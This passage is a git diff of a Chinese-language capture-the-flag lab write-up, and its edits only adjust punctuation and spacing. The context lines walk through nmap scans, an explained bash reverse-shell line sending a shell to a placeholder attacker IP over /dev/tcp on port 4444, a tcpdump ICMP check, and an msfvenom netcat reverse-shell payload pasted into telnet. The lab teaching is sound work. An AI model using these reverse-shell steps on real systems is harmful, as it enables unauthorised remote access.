@@ -379,7 +379,7 @@ Question 1 - 4：`nmap -p- 靶機IP` 進行全端口掃描，發現 8012 端口�
   <img src="/rooms/images/11_16.png" width="600">
 </p>
 
-Question 6、7：進階掃描 8012端口 `nmap -A -p 8012 -T4 靶機IP`
+Question 6、7：進階掃描 8012 端口 `nmap -A -p 8012 -T4 靶機IP`
 
 - fingerprint-string：**指紋字串**，是 nmap 主動送出一些常見的連線請求，看伺服器回什麼反應
 - X11Probe：nmap 嘗試模仿「X11 圖形界面」的連線行為，結果**有回應（正規服務不該有反應）**
@@ -464,7 +464,7 @@ Question 6、7：進階掃描 8012端口 `nmap -A -p 8012 -T4 靶機IP`
 | `>& /dev/tcp/[antiattacker_ip]/4444` | 把 stdout 與 stderr 轉送到 TCP 連線上（這個位置是特殊的 bash 機制） |
 | `0>&1` | 把 stdin 也導向那個連線，形成完整的雙向通訊 |
 
-結果：目標主機會主動「打回你這邊」，你就在你的 Netcat 介面看到一個 shell 🎉<br>
+結果：目標主機會主動「打回你這邊」，你就會在你的 Netcat 介面看到一個 shell 🎉<br>
 `Connection received on [antiattacker_ip] 4444
 bash-5.0$`
 
@@ -478,7 +478,7 @@ Question 2、3：透過提示得知 8012 端口為 telnet 服務，`telnet 目�
   <img src="/rooms/images/11_19.png" width="600">
 </p>
 
-Question 6：另開終端機，`sudo tcpdump ip proto \\icmp -i ens5`，選擇偵聽 ens5 網卡的流量
+Question 6：另開終端機，`sudo tcpdump ip proto \\icmp -i ens5`，選擇偵聽 ens5 網卡的流量。
 
 <p align="left">
   <img src="/rooms/images/11_20.png" width="600">
@@ -490,7 +490,7 @@ Question 6：另開終端機，`sudo tcpdump ip proto \\icmp -i ens5`，選擇�
   <img src="/rooms/images/11_22.png" width="600">
 </p>
 
-虛擬機監聽到兩條記錄，說明目標機 `ping` 虛擬機成功
+虛擬機監聽到兩條記錄，說明目標機 `ping` 虛擬機成功。
 
 <p align="left">
   <img src="/rooms/images/11_21.png" width="600">
@@ -502,7 +502,7 @@ Question 8：另開終端機，使用 `msfvenom` 生成一個 netcat 反向 shel
   <img src="/rooms/images/11_23.png" width="600">
 </p>
 
-Question 9：在虛擬機上開啟 `netcat` 監聽，並在 `telnet` 介面貼上有效 payload
+Question 9：在虛擬機上開啟 `netcat` 監聽，並在 `telnet` 介面貼上有效 payload。
 
 <p align="left">
   <img src="/rooms/images/11_24.png" width="600">
